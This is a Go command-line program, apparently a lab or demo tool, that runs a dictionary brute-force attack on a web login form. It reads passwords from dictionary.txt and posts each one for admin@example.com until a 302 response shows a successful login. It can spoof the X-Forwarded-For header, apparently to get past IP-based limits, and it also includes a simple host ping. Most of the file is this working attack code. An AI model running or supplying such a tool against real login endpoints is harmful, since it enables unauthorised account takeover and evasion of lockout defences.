package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
)

type options struct {
	Host string
	Port int
	URI  string
	From string
}

func ping(o *options) {
	target := fmt.Sprintf("http://%s:%d", o.Host, o.Port)
	fmt.Printf("Pinging %s ...", target)
	response, err := http.Get(target)

	if err != nil {
		fmt.Printf("%s\n", err)
		os.Exit(1)
	} else {
		defer response.Body.Close()
		fmt.Printf(" [%s]\n", response.Status)
	}
}

func loginAttack(o *options) {
	target := fmt.Sprintf("http://%s:%d", o.Host, o.Port)
	endpoint := fmt.Sprintf("%s%s", target, o.URI)
	fmt.Println("Starting login attack on", endpoint)

	file, err := os.Open("dictionary.txt")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	for _, password := range lines {
		data := url.Values{}
		data.Set("inputEmail", "admin@example.com")
		data.Set("inputPassword", password)

		request, err := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
		if err != nil {
			fmt.Printf("%s\n", err)
			os.Exit(1)
		}

		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if o.From != "" {
			request.Header.Add("X-Forwarded-For", o.From)
		}

		transport := http.Transport{}
		response, err := transport.RoundTrip(request)
		if err != nil {
			fmt.Printf("%s\n", err)
			os.Exit(1)
		}

		defer response.Body.Close()

		if response.StatusCode == 302 {
			fmt.Println("The password is:", password)
			os.Exit(0)
		}
	}
}

func main() {
	pingPtr := flag.Bool("ping", false, "Test to see if a host is available")
	hostPtr := flag.String("host", os.Getenv("TARGET"), "Set the host")
	portStr := os.Getenv("PORT")
	portInt, _ := strconv.Atoi(portStr)
	portPtr := flag.Int("port", portInt, "Set the port")
	fromEnv := os.Getenv("FROM")

	var fromPtr *string
	if fromEnv != "" {
		fromPtr = flag.String("from", fromEnv, "Set the X-Forwarded-For header")
	} else {
		fromPtr = flag.String("from", "", "Set the X-Forwarded-For header")
	}
	loginAttackPtr := flag.String("attack", "/", "Hit the login endpoint of an application")

	flag.Parse()

	o := new(options)

	if *hostPtr != "" {
		o.Host = *hostPtr
	}

	if *portPtr != 0 {
		o.Port = *portPtr
	}

	if *loginAttackPtr != "" {
		o.URI = *loginAttackPtr
	}

	if *fromPtr != "" {
		o.From = *fromPtr
	}

	if o.Host == "" && o.Port == 0 {
		fmt.Println("Must supply a host and port")
		os.Exit(1)
	}

	if *pingPtr == true {
		ping(o)
		os.Exit(0)
	}

	if *loginAttackPtr != "" {
		loginAttack(o)
		os.Exit(0)
	}
}
